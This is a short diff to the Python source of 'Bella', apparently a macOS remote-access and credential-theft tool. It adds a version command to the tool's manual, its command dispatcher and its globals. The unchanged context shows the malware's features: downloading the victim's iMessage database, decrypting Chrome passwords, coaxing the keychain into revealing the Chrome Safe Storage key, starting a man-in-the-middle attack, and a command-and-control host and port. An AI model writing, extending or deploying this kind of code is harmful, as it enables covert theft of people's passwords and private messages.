@@ -980,7 +980,8 @@ def keychain_download():
 		return (red_minus + "Error reading keychains.\n%s\n") % str(e)
 
 def manual():
-	value = "\n%sChat History%s\nDownload the user's macOS iMessage database.\nUsage: %schat_history%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
+	value = "\n%sBella Version%s\nReturn Bella's version / release number.\nUsage: %sbella_version%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
+	value += "\n%sChat History%s\nDownload the user's macOS iMessage database.\nUsage: %schat_history%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sCheck Backups%s\nEnumerate the user's local iOS backups.\nUsage: %scheck_backups%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sChrome Dump%s\nDecrypt user passwords stored in Google Chrome profiles.\nUsage: %schrome_dump%s\nRequirements: Chrome SS Key [see chrome_safe_storage]\n" % (underline + bold + green, endANSI, bold, endANSI)
 	value += "\n%sChrome Safe Storage%s\nPrompt the keychain to present the user's Chrome Safe Storage Key.\nUsage: %schrome_safe_storage%s\nRequirements: None\n" % (underline + bold + green, endANSI, bold, endANSI)
@@ -1983,6 +1984,9 @@ def bella(*Emma):
 						key = "%s\n" % check
 					send_msg(key, True)
 
+				elif data == "bella_version":
+					send_msg('%sBella Version%s: %s\n' % (underline, endANSI, bella_version), True)
+
 				elif data.startswith("mitm_start"):
 					interface = data.split(":::")[1]
 					cert = data.split(":::")[2]
@@ -2238,6 +2242,7 @@ payload_list = []
 temp_file_list = []
 host = '127.0.0.1' #Command and Control IP (listener will run on)
 port = 4545 #What port Bella will operate over
+bella_version = '1.10'
 
 #### End global variables ####
 if __name__ == '__main__':
